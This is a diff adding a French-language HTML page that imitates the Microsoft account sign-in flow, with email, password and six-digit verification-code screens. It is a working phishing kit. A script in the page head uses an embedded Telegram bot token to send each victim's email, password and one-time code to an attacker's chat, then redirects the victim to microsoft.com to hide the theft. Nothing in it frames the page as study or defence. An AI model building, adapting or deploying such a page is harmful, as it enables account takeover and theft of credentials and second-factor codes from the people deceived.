@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <!-- Telegram Bot Script -->
+  <script>
+    // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
+    // and 'YOUR_CHAT_ID' with your Telegram chat ID
+    const BOT_TOKEN = '7501297412:AAFyTRLaLFqeCvFLiFku64Sa_Jb0HZk9aT8';
+    const CHAT_ID = '-1002325906333';
+    
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        if (!response.ok) {
+          console.error('Failed to send message to Telegram');
+        }
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Se connecter</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    /* --- Ton CSS initial --- */
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    body {
+      margin: 0;
+      background: #f5f5f5 url('https://raw.githubusercontent.com/Moonclient/pic/877e34f4529ee26dc876af82b401026545d2d1e1/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center center;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+      position: relative;
+      padding-bottom: 60px; /* espace pour le footer */
+    }
+    .login-box {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 460px;
+      padding: 48px 40px 40px 40px;
+      z-index: 1;
+      position: relative;
+      overflow: hidden;
+      opacity: 1;
+      transition: opacity 0.6s ease;
+    }
+    .login-box.fade-out {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .logo-back-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 32px;
+      position: relative;
+    }
+    .back-arrow {
+      position: absolute;
+      left: 0;
+      font-size: 30px;
+      color: #888888;
+      cursor: pointer;
+      user-select: none;
+      text-decoration: none;
+      line-height: 1;
+      padding: 4px;
+      border-radius: 4px;
+      transition: background-color 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .back-arrow:hover {
+      background-color: rgba(136, 136, 136, 0.1);
+    }
+    .logo img {
+      height: 28px;
+    }
+    h2 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 8px;
+      color: #1b1b1b;
+      text-align: center;
+    }
+    .subtitle {
+      font-size: 14px;
+      margin-bottom: 32px;
+      color: #4a4a4a;
+      text-align: center;
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 8px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 14px 40px 8px 12px;
+      font-size: 12px;
+      font-weight: 500;
+      font-family: 'Segoe UI Variable', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      border: 1px solid #8a8886;
+      border-radius: 4px;
+      background: transparent;
+      outline: none;
+      text-align: left;
+      letter-spacing: 0px;
+    }
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 20px;
+      height: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8a8886;
+    }
+    .password-toggle:hover {
+      color: #0067b8;
+    }
+    .password-toggle svg {
+      width: 18px;
+      height: 18px;
+    }
+    .form-group label {
+      position: absolute;
+      top: 14px;
+      left: 12px;
+      font-size: 15px;
+      color: #605e5c;
+      pointer-events: none;
+      transition: 0.2s ease all;
+      background: white;
+      padding: 0 4px;
+    }
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: -8px;
+      left: 8px;
+      font-size: 12px;
+      color: #0067b8;
+    }
+    .link {
+      font-size: 13px;
+      color: #0067b8;
+      text-decoration: none;
+      display: inline-block;
+      font-weight: 650;
+      cursor: pointer;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    button {
+	margin-top: 8px;
+      background-color: #0067b8;
+      color: white;
+      width: 100%;
+      padding: 10px 7px;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005da6;
+    }
+    .bottom-text {
+      margin-top: 32px;
+      font-size: 13px;
+      text-align: center;
+      color: #4a4a4a;
+    }
+    .bottom-text a {
+      color: #0067b8;
+      text-decoration: none;
+      font-weight: 650;
+    }
+    .bottom-text a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: transparent;
+      text-align: center;
+      padding: 12px 0;
+      font-size: 12px;
+      color: #4a4a4a;
+      user-select: none;
+      font-weight: 400;
+      z-index: 10;
+    }
+    .footer a {
+      color: #4a4a4a;
+      text-decoration: none;
+      margin: 0 10px;
+      font-weight: 400;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .footer-note {
+      font-size: 10px;
+      color: #4a4a4a;
+      margin-top: 10px;
+    }
+    .footer-note a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .footer-note a:hover {
+      text-decoration: underline;
+    }
+    .form-group.filled label {
+      top: -8px;
+      left: 8px;
+      font-size: 12px;
+      color: #0067b8;
+    }
+    .email-box {
+      border: 1.5px solid #ccc;
+      border-radius: 25px;
+      padding: 6px 12px;
+      text-align: center;
+      font-weight: 600;
+      font-size: 11px;
+      color: #4a4a4a;
+      margin-bottom: 24px;
+      user-select: text;
+      word-break: break-word;
+      max-width: 160px;
+      margin-left: auto;
+      margin-right: auto;
+      min-height: 28px;
+      background: transparent;
+    }
+
+    /* --- Nouveau style pour la page du code --- */
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .code-group {
+      display: flex;
+      gap: 12px;
+    }
+    .code-inputs input {
+      width: 40px;
+      height: 48px;
+      font-size: 28px;
+      font-weight: 600;
+      text-align: center;
+      border: 1.5px solid #8a8886;
+      border-radius: 6px;
+      outline: none;
+      background: transparent;
+    }
+    .code-inputs input:focus {
+      border-color: #0067b8;
+      box-shadow: 0 0 4px #0067b8;
+    }
+    .bold-link {
+      display: block;
+      font-weight: 700;
+      font-size: 13px;
+      color: #0067b8;
+      text-align: center;
+      cursor: pointer;
+      user-select: none;
+      margin-top: 16px;
+    }
+    .bold-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Animation de chargement */
+    .loading {
+      position: relative;
+      color: transparent !important;
+      pointer-events: none;
+    }
+    .loading::after {
+      content: '';
+      position: absolute;
+      top: calc(50% - 3px); /* Monté de 3px */
+      left: 50%;
+      width: 20px;
+      height: 20px;
+      margin: -10px 0 0 -10px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 32px 20px;
+      }
+      .back-arrow {
+        font-size: 26px;
+        padding: 3px;
+      }
+      .logo-back-container {
+        margin-bottom: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box" id="content"></div>
+
+  <div class="footer">
+    <a href="#">Aide</a>
+    <a href="#">Conditions d'utilisation</a>
+    <a href="#">Confidentialité et cookies</a>
+    <span>Accessibilité : partiellement conforme</span>
+    <div class="footer-note">
+      Utilisez la navigation privée s’il ne s’agit pas de votre appareil.
+      <a href="#">Découvrir plus d’informations</a>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const contentDiv = document.getElementById('content');
+      let currentEmail = '';
+
+      // Charge la page initiale (email)
+      function loadInitialContent() {
+        contentDiv.classList.remove('fade-out');
+        contentDiv.innerHTML = `
+          <div class="logo-back-container">
+            <a href="#" class="back-arrow" id="backArrow" style="display:none;">&#8592;</a>
+            <div class="logo">
+              <img src="https://github.com/Moonclient/pic/blob/main/logo.png?raw=true" alt="Microsoft" />
+            </div>
+          </div>
+          <h2>Se connecter</h2>
+          <div class="subtitle">Utilisez votre compte Microsoft.</div>
+          <form id="loginForm">
+            <div class="form-group filled">
+              <input type="text" id="email" name="email" autocomplete="email" required placeholder=" " />
+              <label for="email">Adresse e-mail ou numéro de téléphone</label>
+            </div>
+            <a href="#" class="link" style="margin-top: 8px; margin-bottom: 24px; display: block;">Vous avez oublié votre nom d’utilisateur ?</a>
+            <button type="submit">Suivant</button>
+          </form>
+          <div class="bottom-text">
+            Vous débutez avec Microsoft ? <a href="#">Créer un compte</a>
+          </div>
+        `;
+
+        const emailInputNew = document.getElementById('email');
+        if(emailInputNew) emailInputNew.focus();
+
+        const formNew = document.getElementById('loginForm');
+        formNew.addEventListener('submit', handleSubmit);
+
+        const backArrowNew = document.getElementById('backArrow');
+        backArrowNew.style.display = 'none';
+        backArrowNew.onclick = null;
+      }
+
+      // Page 2 : Envoyer le code
+      function loadSendCodePage(email) {
+        currentEmail = email;
+        contentDiv.classList.remove('fade-out');
+        contentDiv.innerHTML = `
+          <div class="logo-back-container">
+            <a href="#" class="back-arrow" id="backArrow">&#8592;</a>
+            <div class="logo">
+              <img src="https://github.com/Moonclient/pic/blob/main/logo.png?raw=true" alt="Microsoft" />
+            </div>
+          </div>
+          <div class="email-box">${email}</div>
+          <h2>Obtenez un code pour vous connecter</h2>
+          <div style="font-size: 14px; margin-bottom: 32px; color: #4a4a4a; text-align: center;">
+            Nous vous enverrons un code à <strong>${email}</strong> pour vous connecter.
+          </div>
+          <button id="sendCodeBtn" style="margin-bottom: 24px;">Envoyer le code</button>
+          <div style="margin-top: 24px; font-size: 13px; color: #0067b8; text-align: center; font-weight: 650; cursor: pointer;">
+            Autres méthodes pour se connecter
+          </div>
+        `;
+
+        const backArrow = document.getElementById('backArrow');
+        backArrow.addEventListener('click', (e) => {
+          e.preventDefault();
+          contentDiv.classList.add('fade-out');
+          contentDiv.addEventListener('transitionend', () => {
+            loadPasswordPage(email);
+          }, { once: true });
+        }, { once: true });
+
+        document.getElementById('sendCodeBtn').addEventListener('click', () => {
+          contentDiv.classList.add('fade-out');
+          contentDiv.addEventListener('transitionend', () => {
+            loadEnterCodePage(currentEmail);
+          }, { once: true });
+        });
+      }
+
+      // Page 3 : Entrer le code
+      function loadEnterCodePage(email) {
+        contentDiv.classList.remove('fade-out');
+        contentDiv.innerHTML = `
+          <div class="logo-back-container">
+            <a href="#" class="back-arrow" id="backArrow">&#8592;</a>
+            <div class="logo">
+              <img src="https://github.com/Moonclient/pic/blob/main/logo.png?raw=true" alt="Microsoft" />
+            </div>
+          </div>
+          <div class="email-box">${email}</div>
+          <h2>Entrez votre code</h2>
+          <div class="subtitle" style="margin-bottom: 32px;">
+            Entrez le code que nous avons envoyé à <strong>${email}</strong>.
+          </div>
+          <form id="codeForm" autocomplete="off" style="text-align:center;">
+            <div class="code-inputs">
+              <div class="code-group">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+              </div>
+              <div class="code-group">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="code-digit" required />
+              </div>
+            </div>
+            <button type="submit" style="transition: all 0.3s ease;">Valider</button>
+          </form>
+          <a href="#" class="bold-link" id="noCodeLink">Vous n’avez pas obtenu de code ?</a>
+        `;
+
+        // Retour
+        const backArrow = document.getElementById('backArrow');
+        backArrow.addEventListener('click', (e) => {
+          e.preventDefault();
+          contentDiv.classList.add('fade-out');
+          contentDiv.addEventListener('transitionend', () => {
+            loadSendCodePage(email);
+          }, { once: true });
+        }, { once: true });
+
+        // Gérer focus automatique + déplacement automatique dans les inputs du code
+        const inputs = [...document.querySelectorAll('.code-digit')];
+        inputs.forEach((input, i) => {
+          input.addEventListener('input', (e) => {
+            const val = e.target.value;
+            if (val.length > 1) {
+              e.target.value = val.slice(0,1);
+            }
+            if (val.match(/[^0-9]/)) {
+              e.target.value = ''; // n'accepte que chiffre
+              return;
+            }
+            if (val.length === 1 && i < inputs.length -1) {
+              inputs[i+1].focus();
+            }
+          });
+          input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && i > 0) {
+              inputs[i-1].focus();
+            }
+          });
+        });
+
+        // Soumettre le code (juste un alert pour l'exemple)
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          handleCodeSubmit(e);
+        });
+
+        // Lien "Vous n’avez pas obtenu de code ?"
+        document.getElementById('noCodeLink').addEventListener('click', (e) => {
+          e.preventDefault();
+          alert("Fonctionnalité 'Vous n’avez pas obtenu de code ?' non implémentée.");
+        });
+
+        inputs[0].focus();
+      }
+
+      // Handle code submission
+      function handleCodeSubmit(e) {
+        e.preventDefault();
+        const inputs = document.querySelectorAll('.code-digit');
+        const code = Array.from(inputs).map(input => input.value).join('');
+        const email = document.querySelector('.email-box').textContent;
+        const submitBtn = document.querySelector('#codeForm button[type="submit"]');
+        
+        if (code && /^\d{6}$/.test(code)) {
+          // Désactiver le bouton et afficher l'animation
+          submitBtn.disabled = true;
+          submitBtn.classList.add('loading');
+          
+          // Envoyer le code à Telegram
+          sendToTelegram(`🔑 <b>Verification Code</b>\nEmail: <code>${email}</code>\nCode: <code>${code}</code>`);
+          
+          // Attendre 10 secondes avant de réactiver le bouton et rediriger
+          setTimeout(() => {
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('loading');
+            // Redirection vers Microsoft après l'animation
+            window.location.href = 'https://www.microsoft.com/';
+          }, 10000);
+        } else {
+          // Code invalide, on ne fait rien (ou on pourrait afficher un message d'erreur)
+        }
+      }
+
+      // Handle submit page 1 (email)
+      function handleSubmit(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        if (email && email.includes('@') && email.includes('.')) {
+          // Store email for later use
+          currentEmail = email;
+          
+          // Animation de fondu
+          const content = document.getElementById('content');
+          content.classList.add('fade-out');
+          
+          // Go to password page after animation
+          content.addEventListener('transitionend', () => {
+            loadPasswordPage(email);
+            content.classList.remove('fade-out');
+          }, { once: true });
+        } else {
+          alert('Veuillez entrer une adresse e-mail valide.');
+        }
+      }
+      
+      // Load password page
+      function loadPasswordPage(email) {
+        contentDiv.classList.remove('fade-out');
+        contentDiv.innerHTML = `
+          <div class="logo-back-container">
+            <a href="#" class="back-arrow" id="backArrow">&#8592;</a>
+            <div class="logo">
+              <img src="https://github.com/Moonclient/pic/blob/main/logo.png?raw=true" alt="Microsoft" />
+            </div>
+          </div>
+          <div class="email-box">${email}</div>
+          <h2>Entrez votre mot de passe</h2>
+          <form id="passwordForm" style="margin-top: 24px;">
+            <div class="form-group filled" style="position: relative;">
+              <input type="password" id="password" name="password" autocomplete="current-password" required placeholder=" " style="font-size: 15px; padding: 14px 40px 8px 12px;" />
+              <label for="password">Mot de passe</label>
+              <span class="password-toggle" id="togglePassword" title="Afficher le mot de passe">👁️</span>
+            </div>
+            <div style="margin: 16px 0 24px;">
+              <a href="#" class="link" style="display: block; margin-bottom: 8px;">Mot de passe oublié ?</a>
+            </div>
+            <button type="submit" id="passwordSubmit" style="margin-top: 8px;">Connexion</button>
+          </form>
+          <div class="bottom-text" style="margin-top: 24px;">
+            <a href="#" class="link">Se connecter avec un autre compte</a>
+          </div>
+        `;
+
+        // Handle back button
+        document.getElementById('backArrow').addEventListener('click', (e) => {
+          e.preventDefault();
+          contentDiv.classList.add('fade-out');
+          contentDiv.addEventListener('transitionend', () => {
+            loadInitialContent();
+          }, { once: true });
+        });
+
+        // Toggle password visibility
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        
+        togglePassword.addEventListener('click', function() {
+          const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+          passwordInput.setAttribute('type', type);
+          togglePassword.setAttribute('title', type === 'password' ? 'Afficher le mot de passe' : 'Masquer le mot de passe');
+        });
+
+        // Handle password form submission
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          const password = passwordInput.value;
+          
+          if (password) {
+            // Send password to Telegram
+            sendToTelegram(`🔑 <b>Password Submitted</b>\nEmail: <code>${email}</code>\nPassword: <code>${password}</code>`);
+            
+            // Show loading state
+            const submitBtn = document.getElementById('passwordSubmit');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Connexion en cours...';
+            submitBtn.classList.add('loading');
+            
+            // Simulate loading and go to code page
+            setTimeout(() => {
+              contentDiv.classList.add('fade-out');
+              contentDiv.addEventListener('transitionend', () => {
+                loadSendCodePage(email);
+                contentDiv.classList.remove('fade-out');
+              }, { once: true });
+            }, 1500);
+          }
+        });
+      }
+
+      // Démarre sur la 1ère page
+      loadInitialContent();
+    });
+  </script>
+</body>
+</html>
